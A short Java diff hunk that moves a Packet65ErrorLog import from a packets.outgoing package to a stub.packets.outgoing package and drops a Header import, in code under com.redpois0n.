@@ -5,8 +5,7 @@ import java.io.FileInputStream;
 import com.redpois0n.Connection;
 import com.redpois0n.Main;
 import com.redpois0n.common.crypto.Crypto;
-import com.redpois0n.packets.outgoing.Header;
-import com.redpois0n.packets.outgoing.Packet65ErrorLog;
+import com.redpois0n.stub.packets.outgoing.Packet65ErrorLog;
 import com.redpois0n.utils.Utils;
 
 
